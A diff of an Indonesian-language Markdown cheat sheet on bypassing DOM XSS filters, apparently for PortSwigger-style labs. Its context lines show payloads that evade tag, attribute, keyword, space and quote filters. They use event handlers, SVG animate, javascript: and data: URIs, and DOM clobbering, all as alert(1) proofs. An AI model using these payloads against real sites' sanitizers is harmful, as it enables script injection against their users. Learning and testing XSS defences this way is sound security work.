@@ -1,6 +1,6 @@
 # 📌 DOM XSS Bypass Filter Cheat Sheet (Advanced)
 
----
+
 
 ## 🧠 1. HTML Entity Encoding Bypass
 
@@ -19,7 +19,7 @@
 * Gunakan double decoding bug
 * Gunakan context lain (attribute / URL)
 
----
+
 
 ## 🧠 2. Tag Blacklist Bypass
 
@@ -33,7 +33,7 @@ Jika `<script>` diblok:
 <body onload=alert(1)>
 ```
 
----
+
 
 ## 🧠 3. Attribute Blacklist Bypass (onerror/onload diblok)
 
@@ -52,7 +52,7 @@ Contoh:
 <img src=x onmouseover=alert(1)>
 ```
 
----
+
 
 ## 🧠 4. Keyword Filter Bypass (alert / script)
 
@@ -69,7 +69,7 @@ confirm(1)
 prompt(1)
 ```
 
----
+
 
 ## 🧠 5. Space Filtering Bypass
 
@@ -87,7 +87,7 @@ src=x
 onerror=alert(1)>
 ```
 
----
+
 
 ## 🧠 6. Quotes Blocking Bypass
 
@@ -103,7 +103,7 @@ atau exploit tanpa quotes:
 <img src=x onerror=alert(1)>
 ```
 
----
+
 
 ## 🧠 7. innerHTML Sanitizer Bypass
 
@@ -115,7 +115,7 @@ Jika filter hapus `<script>`:
 <svg><animate onbegin=alert(1) attributeName=x dur=1s>
 ```
 
----
+
 
 ## 🧠 8. Event Handler Stripping Bypass
 
@@ -131,7 +131,7 @@ Kalau `on*` dihapus:
 <object data="javascript:alert(1)">
 ```
 
----
+
 
 ## 🧠 9. URL Context Bypass
 
@@ -145,7 +145,7 @@ javascript:alert(1)
 data:text/html,<script>alert(1)</script>
 ```
 
----
+
 
 ## 🧠 10. DOM Clobbering (Advanced Lab Trick)
 
@@ -158,7 +158,7 @@ Trigger JS:
 * `alert` jadi DOM object
 * bisa override reference di JS
 
----
+
 
 # 📌 QUICK MIND MAP
 
@@ -172,13 +172,13 @@ Quotes blocked → no-quote payload
 Script blocked → event handlers / JS URI
 ```
 
----
+
 
 # 📌 REAL LAB RULE (PortSwigger mindset)
 
 > Tidak ada filter yang benar-benar “menghapus XSS”, hanya menggeser konteks.
 
----
+
 
 # 📌 FAST DECISION RULE
 
